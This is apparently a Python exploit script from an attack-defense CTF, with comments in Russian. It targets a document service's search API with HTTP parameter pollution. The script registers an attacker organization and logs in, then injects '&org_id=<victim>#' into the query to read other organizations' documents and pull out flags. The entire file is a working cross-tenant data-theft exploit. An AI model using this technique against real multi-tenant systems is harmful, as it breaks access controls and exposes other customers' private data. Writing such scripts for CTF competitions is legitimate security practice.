#!/usr/bin/env python3
# Эксплуатация уязвимости parameter pollution

import random
import sys
import json
import re

import checklib

class DocLib:
    def __init__(self, host: str):
        self.host = host
        self.session = checklib.get_initialized_session()

    def list_orgs(self):
        response = self.session.get(
            f"{self.host}/api/organizations"
        )
        response.raise_for_status()
        return response.json()

    def create_org(self, domain: str):
        document = {
            "domain": domain,
        }

        response = self.session.post(
            f"{self.host}/api/organizations",
            json=document
        )
        response.raise_for_status()
        return response.json()

    def create_user(self, username: str, password: str, token: str):
        document = {
            "username": username,
            "password": password,
            "token": token
        }

        response = self.session.post(
            f"{self.host}/api/users",
            json=document
        )
        response.raise_for_status()
        return response.json()

    def login(self, username: str, password: str):
        document = {
            "email": username,
            "password": password
        }

        response = self.session.post(
            f"{self.host}/api/login",
            json=document
        )
        response.raise_for_status()
        token_data =  response.json()
        token = token_data.get('token')
        self.session.headers['Authorization'] = f"Bearer {token}"

    def search(self, query: str):
        response = self.session.get(
            f"{self.host}/api/documents",
            params={'query': query}
        )
        response.raise_for_status()
        return response.json()

def extract_flags(documents):
    """Извлекает флаги из документов"""
    flags = []
    # Стандартный формат флага CTF: FLAG{...} или похожий
    flag_pattern = re.compile(r'[A-Z0-9]{31}=')
    
    for doc in documents:
        content = doc.get('content', '')
        # Ищем флаги в содержимом
        found_flags = flag_pattern.findall(content)
        if found_flags:
            flags.extend(found_flags)
        # Если не нашли флаг по паттерну, возвращаем весь контент
        elif content:
            flags.append(content)
    
    return flags

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 ssrf_injection.py <ip> [attack_data]")
        print("  If attack_data not provided, will fetch latest organization automatically")
        sys.exit(1)

    ip = sys.argv[1]
    lib = DocLib(f"http://{ip}:8000")

    # Режим 1: Автоматический - получаем последний org_id
    if len(sys.argv) == 2:
        print("[*] Fetching organizations list...")
        orgs = lib.list_orgs()
        
        if not orgs:
            print("[-] No organizations found!")
            sys.exit(1)
        
        # Берем последнюю организацию из массива
        last_org = orgs[-1]
        victim_org_id = last_org['id']
        victim_domain = last_org['domain']
        
        print(f"[+] Target: {victim_domain} (org_id: {victim_org_id})")
        attack_data = [f"{victim_domain}:{victim_org_id}:dummy"]
    
    # Режим 2: Ручной - используем переданный attack_data
    else:
        attack_data = json.loads(sys.argv[2])

    # Создаем свою организацию
    print("[*] Creating attacker organization...")
    pocs = random.randint(0, 10000)
    org_name = f'exploit{pocs}.ru'
    org = lib.create_org(org_name)
    token = org.get('token')
    print(f"[+] Created: {org_name}")

    # Регистрируем пользователя
    print("[*] Creating user...")
    username, pwd = checklib.rnd_username(), checklib.rnd_password()
    lib.create_user(username, pwd, token)
    
    # Логинимся
    print("[*] Logging in...")
    lib.login(f'{username}@{org_name}', pwd)
    print(f"[+] Logged in as: {username}@{org_name}")

    # Эксплуатируем уязвимость для каждой цели
    all_flags = []
    for p in attack_data:
        org_domain, org_id, doc_id = p.split(':')
        print(f"\n[*] Exploiting {org_domain} (org_id: {org_id})...")
        
        # Используем parameter pollution
        payload = f'&org_id={org_id}#'
        print(f"[*] Payload: {payload}")
        
        try:
            documents = lib.search(payload)
            print(f"[+] Found {len(documents)} documents")
            
            # Извлекаем флаги
            flags = extract_flags(documents)
            all_flags.extend(flags)
            
            # Выводим результаты
            for i, doc in enumerate(documents, 1):
                print(f"\n--- Document {i} ---")
                print(f"ID: {doc.get('id')}")
                print(f"Title: {doc.get('title')}")
                print(f"Content: {doc.get('content')}")
        
        except Exception as e:
            print(f"[-] Error: {e}")

    # Выводим все найденные флаги
    if all_flags:
        print(f"\n{'='*60}")
        print(f"[+] FOUND {len(all_flags)} FLAGS:")
        print(f"{'='*60}")
        for flag in all_flags:
            print(flag)
    else:
        print("\n[-] No flags found")

if __name__ == '__main__':
    main()

